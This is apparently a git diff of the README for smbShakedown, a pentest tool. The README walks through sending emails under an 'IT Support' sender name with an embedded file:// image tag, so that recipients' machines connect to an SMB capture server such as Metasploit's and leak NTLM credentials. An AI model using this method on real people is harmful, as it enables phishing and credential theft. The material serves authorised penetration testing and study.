@@ -7,53 +7,34 @@
     cd smbShakedown/
     python smbShakedown.py
     
-#Usage
+#Example
         Launch smbShakedown.py and follow the wizard:
         
-        Enter SMTP Server address[smtp.gmail.com]: mail.myrelay.com
-        ENTERED: "mail.myrelay.com"
+        Enter SMTP Server address[smtp.gmail.com]: 
+        ENTERED: "smtp.gmail.com"
 
-        Enter your SMTP Server Port[587]: 25
-        ENTERED: "25"
+        Enter your SMTP Server Port[587]: 
+        ENTERED: "587"
 
-        Enter SMTP Server username[user@gmail.com]: beamr@gmail.com
-        ENTERED: "beamr@gmail.com"
+        Enter SMTP Server username[user@gmail.com]: 
+        ENTERED: "user@gmail.com"
 
         Enter SMTP Server password: 
 
-        Enter SMB Capture Server IP address[10.0.0.7]: 
-        ENTERED:10.0.0.7
+        Enter SMB Capture Server IP address[10.37.242.7]: 
+        ENTERED:10.37.242.7
 
         Enter "from name":[IT Support]
         ENTERED:IT Support
-
-        Enter "from address":[itsupport@company.com]support@company123.com
-        ENTERED:support@company123.com
-
-        Enter recipient(s) name[Bob]: Nick
-        ENTERED:Nick
+        
+        Enter "from address":[user@gmail.com]:user@gmail.com
+        ENTERED:user@gmail.com
+        
+        Enter recipient(s) name[Bob]: Bob
+        ENTERED:Bob
         
         etc..
-
-#External Pentest
-    Virtual Private Server (VPS) recommended.
-    If behind a firewall be sure to enable port forwarding for your SMB Capture Server:
-    
-    1.Configure SMTP Relay server address:
-    
-    2.Enter SMTP Relay server credentials: 
-    (anonymous connections not yet supported.)
-    
-    3.Configure "from" and "to" addresses:
-    
-    4.Enter SMBCapture Server IP address, so it can be placed in body of email: 
-    EX: <img src=file://127.0.0.1/image/foo.gif>
-    *Verify this is the external IP address*
-    
-    5.SMBCapture Server does not have to be hosted locally:
-    EX: Use a VPS
-
-#Internal Pentest
+#Usage
     1.Configure SMTP Server, smarthost/localhost/other:
     (Looking into intergrating smtpd for local SMTP server option)
     
@@ -65,9 +46,8 @@
     4.Enter SMBCapture Server IP address, so it can be placed in body of email:
     EX: <img src=file://127.0.0.1/image/foo.gif>
     
-    5.SMBCapture Server can be hosted locally:
-    EX: Metasploit's SMB Capture server can be configured to automatically launch.
-
+    5. Choose whether or not to launch Metasploit's SMB Capture server.
+    
 #To do:
     Multiple recipient address support.
     SMTP Anonymous Auth option
